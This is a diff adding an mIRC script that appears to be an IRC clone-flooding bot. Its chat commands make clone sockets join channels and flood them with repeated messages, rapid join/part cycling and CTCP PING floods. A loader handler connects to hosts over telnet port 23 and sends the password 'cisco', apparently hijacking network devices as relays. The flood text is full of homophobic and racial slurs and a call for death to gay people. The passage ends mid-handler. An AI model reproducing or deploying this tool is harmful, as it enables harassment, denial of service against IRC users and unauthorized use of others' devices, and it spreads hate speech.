@@ -1,0 +1,274 @@
+on 10:TEXT:!clonez.help*:*:{
+  /msg $chan My Commands for trigger !clonez: !clonez.msgflood1 <chan>, !clonez.msgflood2 <chan>, !clonez.msgflood3 <chan>, !clonez.msgflood4 <chan>, !clonez.saytochan <chan> <msg>, !clonez.cycle <chan>, !clonez.supercycle <chan>, !clonez.join <chan>, !clonez.part <chan>, !clonez.quit <msg>, !clonez.ctcpflood <chan/user>
+}
+on 10:TEXT:!clonez.server*:*:{
+  set %cloneserver $2
+  /msg $chan clonezServer now set to: %cloneserver
+}
+on 10:TEXT:!clonez.chan*:*:{
+  set %clonezchan $2
+  /msg $chan clonezServer now set to: %clonezchan
+}
+on 10:TEXT:!clonez.msgflood1*:*:{
+  /msg $chan MsgFlood1 started in $2
+  sockwrite -n * join $2
+  sockwrite -n * privmsg $2 : ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִv
+  sockwrite -n * privmsg $2 : עמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביה
+  sockwrite -n * privmsg $2 : ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִv
+  sockwrite -n * privmsg $2 : עמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביה
+  sockwrite -n * privmsg $2 : עמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביהעמיצו שבוע ומזל טוב שבוע ומזל לצביהשבוע טוב ומזל טוב לצביה
+  sockwrite -n * privmsg $2 : ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִv
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+}
+on 10:TEXT:!clonez.msgflood2*:*:{
+  /msg $chan MsgFlood2 started in $2
+  sockwrite -n * join $2
+  sockwrite -n * privmsg $2 : 12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p
+  sockwrite -n * privmsg $2 : 12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p
+  sockwrite -n * privmsg $2 : 12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p
+  sockwrite -n * privmsg $2 : 12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p
+  sockwrite -n * privmsg $2 : 12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p
+  sockwrite -n * privmsg $2 : 12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p12,1b a c k d a f u c k u p o r y o u g o n a g e t s m a c k e d d a f u c k u p
+  sockwrite -n * part $2 SuCk My BaLlZ NiGgAz
+} 
+on 10:TEXT:!clonez.msgflood3*:*:{
+  /msg $chan MsgFlood3 started in $2
+  sockwrite -n * join $2
+  sockwrite -n * privmsg $2 : FaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0z
+  sockwrite -n * privmsg $2 : FaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0z
+  sockwrite -n * privmsg $2 : FaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0z
+  sockwrite -n * privmsg $2 : FaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0z
+  sockwrite -n * privmsg $2 : FaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0z
+  sockwrite -n * privmsg $2 : FaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0zFaGgOtSPoOfsSicKfuCKz4DeAthToGayS!!QuEeR ChILd MoLeStIng WeIrD0z
+  sockwrite -n * part $2 FAGGOTS!!!
+}
+on 10:TEXT:!clonez.msgflood4*:*:{
+  /msg $chan MsgFlood4 started in $2
+  sockwrite -n * join $2
+  sockwrite -n * privmsg $2 : blingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingbling
+  sockwrite -n * privmsg $2 : blingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingbling
+  sockwrite -n * part $2 MoneyAintaTHinG
+  sockwrite -n * join $2
+  sockwrite -n * privmsg $2 : blingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingbling
+  sockwrite -n * privmsg $2 : blingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingbling
+  sockwrite -n * part $2 MoneyAintaTHinG
+  sockwrite -n * join $2
+  sockwrite -n * privmsg $2 : blingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingbling
+  sockwrite -n * privmsg $2 : blingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingblingbling
+  sockwrite -n * part $2 MoneyAintaTHinG
+}
+on 10:TEXT:!clonez.saytochan*:*:{
+  /msg $chan Saying " $+ $3- $+ " in $2
+  sockwrite -n * join $2
+  sockwrite -n * privmsg $2 : $3-
+  sockwrite -n * part $2
+  sockwrite -n * join $2
+  sockwrite -n * privmsg $2 : $3-
+  sockwrite -n * part $2
+  sockwrite -n * join $2
+  sockwrite -n * privmsg $2 : $3-
+  sockwrite -n * part $2
+  sockwrite -n * join $2
+  sockwrite -n * privmsg $2 : $3-
+  sockwrite -n * part $2
+  sockwrite -n * join $2
+  sockwrite -n * privmsg $2 : $3-
+  sockwrite -n * part $2
+  sockwrite -n * join $2
+  sockwrite -n * privmsg $2 : $3-
+  sockwrite -n * part $2
+}
+on 10:TEXT:!clonez.cycle*:*:{
+  /msg $chan Cycling started in $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+}
+on 10:TEXT:!clonez.supercycle*:*:{
+  /msg $chan SuperCycling started in $2 $+! yeeehaaa!
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+  sockwrite -n * join $2
+  sockwrite -n * part $2 ק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִק-ִ,¦¢Xִ
+}
+on 10:TEXT:!clonez.join*:*:{
+  /msg $chan All my clones joined $2
+  sockwrite -n * join $2
+}
+on 10:TEXT:!clonez.part*:*:{
+  /msg $chan All my clones parted $2
+  sockwrite -n * part $2
+}
+on 10:TEXT:!clonez.quit*:*:{
+  /msg $chan Quited ( $+ $2 $+ )
+  sockwrite -n * quit $2
+  sockclose *
+}
+on 10:TEXT:!clonez.ctcpflood*:*:{ 
+  /msg $chan CTCPFlooding $2
+  sockwrite -n * join $2
+  sockwrite -n * privmsg $2 : $+ $chr(1) $+ PING $+ $chr(1) 
+  sockwrite -n * privmsg $2 : $+ $chr(1) $+ PING $+ $chr(1) 
+  sockwrite -n * privmsg $2 : $+ $chr(1) $+ PING $+ $chr(1) 
+  sockwrite -n * privmsg $2 : $+ $chr(1) $+ PING $+ $chr(1) 
+  sockwrite -n * privmsg $2 : $+ $chr(1) $+ PING $+ $chr(1) 
+}
+on 10:TEXT:!clonez.load*:*:{ 
+  /msg $chan Loading clonez to %cloneserver ...
+  set -q %cnum 1
+  :loop 
+  sockopen cfld $+ $r(1,999999) $read clonez.txt 23
+  inc %cnum
+  if (%cnum == 5) { halt | haltdef } 
+  else goto loop
+}
+
+;cayfloods ( cfld ) 
+on 1:sockopen:cfld*: {
+  inc %ccount 
+  sockwrite -n $sockname cisco  
+  sockwrite -tn $sockname %cloneserver 6666 
